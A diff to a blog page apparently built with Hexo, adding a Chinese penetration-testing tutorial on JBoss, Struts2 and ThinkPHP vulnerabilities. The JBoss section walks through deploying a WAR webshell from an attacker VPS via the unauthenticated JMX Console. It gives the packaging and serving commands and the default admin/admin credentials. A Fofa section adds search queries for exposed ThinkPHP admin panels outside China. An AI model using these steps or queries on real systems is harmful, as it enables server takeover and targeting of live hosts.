@@ -36,8 +36,17 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131414384.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131632799.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131820267.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829174426741.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/wps9.png">
+<meta property="og:image" content="d:\hexo\source_posts\%E6%B8%97%E9%80%8F\%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8.assets\image-20230829175122378.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175409944.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175542082.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180143397.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180158733.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180720926.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180753344.png">
 <meta property="article:published_time" content="2023-08-26T02:08:49.000Z">
-<meta property="article:modified_time" content="2023-08-29T05:49:27.904Z">
+<meta property="article:modified_time" content="2023-08-29T10:09:37.748Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -241,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3k words
+          5.2k words
         
       </span>
     
@@ -252,7 +261,7 @@
         
         
         
-          25 mins
+          44 mins
         
       </span>
     
@@ -503,7 +512,140 @@
 </ol>
 </li>
 </ol>
-<h2 id="java-开发框架struts2系列漏洞"><a href="#java-开发框架struts2系列漏洞" class="headerlink" title="java 开发框架struts2系列漏洞"></a>java 开发框架struts2系列漏洞</h2>
+<h2 id="java-开发框架漏洞"><a href="#java-开发框架漏洞" class="headerlink" title="java 开发框架漏洞"></a>java 开发框架漏洞</h2><h3 id="JBOSS漏洞"><a href="#JBOSS漏洞" class="headerlink" title="JBOSS漏洞"></a>JBOSS漏洞</h3><ol>
+<li><p>JBOSS简介</p>
+<p>一个基于J2EE的开放源代码的应用服务器</p>
+<p>JBoss 是一个管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet&#x2F;JSP 的WEB容器，一般与<strong>Tomcat</strong>或<strong>Jetty</strong>绑定使用。Jboss是 <strong>Java EE</strong> 应用服务器（就像Apache是web服务器一样），专门用来运行Java EE程序的</p>
+</li>
+<li><p>JBOSS历史漏洞</p>
+<ul>
+<li><p>访问控制不严格导致的漏洞</p>
+<blockquote>
+<p>JMX Console未授权访问Getshell</p>
+<p>Administration Console 弱口令 Getshell</p>
+<p>CVE-2007-1036 – JMX Console HtmlAdaptor Getshell</p>
+<p>CVE-2010-0738 – JMX控制台安全验证绕过漏洞</p>
+</blockquote>
+</li>
+<li><p>反序列化</p>
+<blockquote>
+<p>CVE-2013-4810 – JBoss EJBInvokerServlet 反序列化漏洞</p>
+<p>CVE-2015-7501 – JBoss JMXInvokerServlet 反序列化漏洞</p>
+<p>CVE-2017-7504 – JBoss 4.x JBossMQ JMS 反序列化漏洞</p>
+<p>CVE-2017-12149 – JBosS AS 6.X 反序列化漏洞</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>JBOSS漏洞的发现</p>
+<p>只要出现以下的场景就会出现</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829174426741.png" srcset="/img/loading.gif" lazyload alt="image-20230829174426741"></p>
+</li>
+<li><p>JBOSS历史漏洞的利用</p>
+<ol>
+<li><h6 id="JMX-Console-未授权访问漏洞"><a href="#JMX-Console-未授权访问漏洞" class="headerlink" title="JMX Console 未授权访问漏洞"></a>JMX Console 未授权访问漏洞</h6><blockquote>
+<p>Jboss的webUI界面 <a href="http://ip:port/jmx-console">http://ip:port/jmx-console</a> 未授权访问(或默认密码 <strong>admin&#x2F;admin</strong>)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取 webshell</p>
+</blockquote>
+</li>
+<li><p>发现</p>
+<p>由于只用JBOSS搭建的，我们可以试探性的访问</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/jmx-console/">http://xx.xx.xx.xx/jmx-console/</a></p>
+</blockquote>
+<p>看是否存在漏洞，如果访问成功就说明存在罗漏洞</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/wps9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+</li>
+<li><p>漏洞利用</p>
+<p>原理和weblogic是一致的</p>
+<ul>
+<li><p>远程部署war包</p>
+<blockquote>
+<p>找到 jboss.deployment 选项 (Jboss自带的部署功能）中的</p>
+<p>flavor&#x3D;URL,type&#x3D;DeploymentScanner点进去（通过 url 的方式远程部署）</p>
+<p>也可以直接输入以下URL进入：</p>
+</blockquote>
+<p>也可以输入URL进入</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deploymen">http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deploymen</a></p>
+<p>t:type&#x3D;DeploymentScanner,flavor&#x3D;URL</p>
+</blockquote>
+<p><img src="D:\hexo\source_posts\渗透\漏洞攻击利用.assets\image-20230829175122378.png" srcset="/img/loading.gif" lazyload alt="image-20230829175122378"></p>
+<p>进入页面后找到void addURL()</p>
+<p>下面是部署远程的war包木马</p>
+<blockquote>
+<p><em>#</em> 打包冰蝎<em>jsp</em>马为<em>war</em>包</p>
+<p>jar -cvf shell.war shell.jsp</p>
+<p><em>#</em> 在<em>vps</em>上启动<em>web</em>服务</p>
+<p>python -m <strong>http</strong>.server</p>
+<p><em># war</em>包下载地址</p>
+<p><strong>http</strong>:&#x2F;&#x2F;vps-IP:8000&#x2F;shell.war</p>
+</blockquote>
+<p>然后后点击Invoke部署</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175409944.png" srcset="/img/loading.gif" lazyload alt="image-20230829175409944"></p>
+<p>随后点击 Back to MBean View来到 URLList 中查看 Value 值是否已经部署好，并且为我们的远程war木马地址</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175542082.png" srcset="/img/loading.gif" lazyload alt="image-20230829175542082"></p>
+<p>最后点击 Apply Changes 后耐心等待一会儿，然后回到 JMX-Console 目录中</p>
+<p>注意：等待的时间是有点长的</p>
+<p>返回jmx-console 目录找到 jboss.web.deployment 查看是否存在我们部署的war木马</p>
+<p>等到部署成功我们可以使用webshell管理程序</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h3><ol>
+<li><p>简介</p>
+<p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级</p>
+<p>Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts1和Struts2；Struts2是一个基于</p>
+<p>MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器</p>
+<p>(Controller)来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在 struts1和WebWork的</p>
+<p>技术基础上进行了合并的全新的Struts2框架。</p>
+</li>
+<li><p>历史漏洞</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180143397.png" srcset="/img/loading.gif" lazyload alt="image-20230829180143397"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180158733.png" srcset="/img/loading.gif" lazyload alt="image-20230829180158733"></p>
+</li>
+<li><p>历史漏洞原理分析</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1583">https://tttang.com/archive/1583</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/struts2-5/">https://su18.org/post/struts2-5/</a></p>
+</blockquote>
+</li>
+<li><p>环境建议使用vulhub</p>
+</li>
+<li><p>漏洞发现</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Guaang/s2-tool">https://github.com/Guaang/s2-tool</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p>
+</li>
+<li><p>历史漏洞利用</p>
+</li>
+</ol>
+<h2 id="php开发框架漏洞"><a href="#php开发框架漏洞" class="headerlink" title="php开发框架漏洞"></a>php开发框架漏洞</h2><h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><ol>
+<li><p>简介</p>
+<p>Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。</p>
+</li>
+<li><p>历史漏洞</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180720926.png" srcset="/img/loading.gif" lazyload alt="image-20230829180720926"></p>
+</li>
+<li><p>漏洞发现</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180753344.png" srcset="/img/loading.gif" lazyload alt="image-20230829180753344"></p>
+<p>这个报错就出现了他的版本信息</p>
+<ul>
+<li><p>使用Fofa</p>
+<blockquote>
+<p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN”</p>
+<p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理”</p>
+<p>header&#x3D;”thinkphp”&amp;&amp;country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理” &amp;&amp; after&#x3D;”2021-01-01”</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+</li>
+</ol>
+
                 
               </div>
             
